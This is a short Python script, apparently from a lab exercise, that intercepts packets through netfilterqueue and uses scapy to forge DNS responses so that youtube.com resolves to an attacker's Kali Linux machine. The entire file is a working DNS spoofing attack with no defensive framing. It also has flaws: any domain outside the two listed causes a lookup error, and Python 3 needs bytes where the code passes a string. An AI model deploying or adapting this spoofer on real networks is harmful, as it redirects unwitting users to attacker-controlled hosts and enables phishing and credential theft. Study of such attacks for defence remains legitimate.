import netfilterqueue
import scapy.all as scapy

def callback(packet):
    
    #Kali Linux IP and assigning the IP to target website 
    attacker_IP = '10.0.2.15'
    target = { b'www.youtube.com.' : attacker_IP, b'youtube.com.' : attacker_IP}
    
    scapy_packet = scapy.IP(packet.get_payload())
    
    #Checking whether a packet has a DNS response
    if scapy_packet.haslayer(scapy.DNSRR) == True:
    
       qname = scapy_packet[scapy.DNSQR].qname
    
       #rdata will always be the attacker_IP but qname can be different
       scapy_packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=target[qname])
       scapy_packet[scapy.DNS].ancount = 1
    
       #Deleting the IP and UDP packets length and checksum data
       del scapy_packet[scapy.IP].len
       del scapy_packet[scapy.IP].chksum
       del scapy_packet[scapy.UDP].len
       del scapy_packet[scapy.UDP].chksum

       #Setting payload of the packet as the modified packet
       packet.set_payload(str(scapy_packet))
       print(scapy_packet.show())
       
    packet.accept()
 
q=netfilterqueue.NetfilterQueue()
q.bind(1, callback)
q.run()
